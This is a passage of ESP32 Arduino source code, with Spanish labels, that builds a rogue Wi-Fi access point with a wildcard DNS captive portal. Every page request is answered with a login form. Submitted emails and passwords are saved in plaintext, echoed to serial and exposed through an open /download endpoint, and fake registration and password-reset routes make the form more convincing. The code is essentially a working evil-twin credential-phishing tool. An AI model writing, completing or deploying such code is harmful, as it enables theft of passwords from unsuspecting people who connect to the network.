void saveCredentials(String correo, String pass) {
    File file = SPIFFS.open(credFile, "a");
    if (!file) file = SPIFFS.open(credFile, "w");
    if (file) {
        file.println("Correo: " + correo);
        file.println("Contraseña: " + pass);
        file.println("---");
        file.close();
    }
}

bool updatePassword(String correo, String newPass) {
    if (!SPIFFS.exists(credFile)) return false;
    File file = SPIFFS.open(credFile, "r");
    String content = "";
    while (file.available()) content += file.readString();
    file.close();
    int pos = content.indexOf("Correo: " + correo);
    if (pos == -1) return false;
    int startPass = content.indexOf("Contraseña: ", pos);
    int endPass = content.indexOf("\n", startPass);
    String oldLine = content.substring(startPass, endPass);
    content.replace(oldLine, "Contraseña: " + newPass);
    File outFile = SPIFFS.open(credFile, "w");
    outFile.print(content);
    outFile.close();
    return true;
}

bool userExists(String correo) {
    if (!SPIFFS.exists(credFile)) return false;
    File file = SPIFFS.open(credFile, "r");
    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.indexOf("Correo: " + correo) != -1) { file.close(); return true; }
    }
    file.close();
    return false;
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    if (!SPIFFS.begin(true)) { Serial.println("Error SPIFFS"); return; }
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(local_ip, gateway, subnet);
    WiFi.softAP(apSSID, apPassword);
    Serial.print("IP: "); Serial.println(WiFi.softAPIP());
    dnsServer.start(53, "*", WiFi.softAPIP());
    
    server.on("/guardar", HTTP_POST, []() {
        String correo = server.arg("correo");
        String pass = server.arg("contrasena");
        if (correo.length() > 0 && pass.length() > 0) {
            saveCredentials(correo, pass);
            Serial.println("Login - Correo: " + correo + " Pass: " + pass);
            server.send(200, "text/html", successPage);
        } else server.send(400, "text/plain", "Faltan datos");
    });
    
    server.on("/reset", HTTP_POST, []() {
        String correo = server.arg("correo");
        String newPass = server.arg("contrasena");
        if (userExists(correo)) {
            if (updatePassword(correo, newPass)) server.send(200, "text/plain", "OK");
            else server.send(400, "text/plain", "Error");
        } else server.send(404, "text/plain", "Usuario no encontrado");
    });
    
    server.on("/registrar", HTTP_POST, []() {
        String correo = server.arg("correo");
        String pass = server.arg("contrasena");
        if (userExists(correo)) server.send(400, "text/plain", "El usuario ya existe");
        else { saveCredentials(correo, pass); server.send(200, "text/plain", "OK"); }
    });
    
    server.on("/download", HTTP_GET, []() {
        if (SPIFFS.exists(credFile)) {
            File file = SPIFFS.open(credFile, "r");
            server.streamFile(file, "text/plain");
            file.close();
        } else server.send(404, "text/plain", "No hay credenciales");
    });
    
    server.onNotFound([]() { server.send(200, "text/html", loginPage); });
    server.begin();
    Serial.println("Servidor iniciado");
}

void loop() {
    dnsServer.processNextRequest();
    server.handleClient();
}
